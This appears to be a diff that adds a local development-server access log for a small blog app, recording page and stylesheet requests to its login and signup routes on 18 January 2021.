+[18/Jan/2021 20:47:56] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:56] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:56] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:56] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:56] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:48:32] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:48:32] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:48:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:48:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:48:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:48:33] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:48:33] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:48:43] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:48:43] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:48:43] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:48:43] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:48:43] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:48:43] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:49:30] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:49:30] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:49:31] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:49:31] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:49:31] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 20:49:35] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:49:38] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:49:46] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:49:50] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:49:53] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:49:54] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 20:49:54] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 20:49:58] "GET /auth/signup HTTP/1.1" 200 5227
+[18/Jan/2021 20:50:03] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:50:03] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:50:09] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:50:09] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:50:09] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+Not Found: /www.instagram.com:443
+[18/Jan/2021 20:50:18] "CONNECT www.instagram.com:443 HTTP/1.1" 404 1682
+[18/Jan/2021 20:51:00] "GET /auth/signup HTTP/1.1" 200 5227
+[18/Jan/2021 20:51:00] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:51:00] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:51:00] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:51:00] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:51:00] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:51:00] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:54:26] "GET /auth/signup HTTP/1.1" 200 0
+[18/Jan/2021 20:54:34] "GET /auth/signup HTTP/1.1" 200 0
+[18/Jan/2021 20:54:39] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:54:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 20:54:41] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:54:41] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 20:54:42] "GET /auth/signup HTTP/1.1" 200 0
+[18/Jan/2021 20:56:38] "GET /auth/signup HTTP/1.1" 200 0
+[18/Jan/2021 21:08:09] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 21:08:10] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 21:08:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:08:10] "GET /auth/signup HTTP/1.1" 200 4986
+[18/Jan/2021 21:08:40] "GET /auth/signup HTTP/1.1" 200 5044
+[18/Jan/2021 21:08:40] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:08:40] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:08:49] "GET /auth/signup HTTP/1.1" 200 5021
+[18/Jan/2021 21:08:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:08:58] "GET /auth/signup HTTP/1.1" 200 4737
+[18/Jan/2021 21:08:58] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:13:31] "GET /auth/signup HTTP/1.1" 200 5241
+[18/Jan/2021 21:13:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[18/Jan/2021 21:13:32] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 21:13:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 21:13:57] "GET /auth/signup HTTP/1.1" 200 5243
+[18/Jan/2021 21:13:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
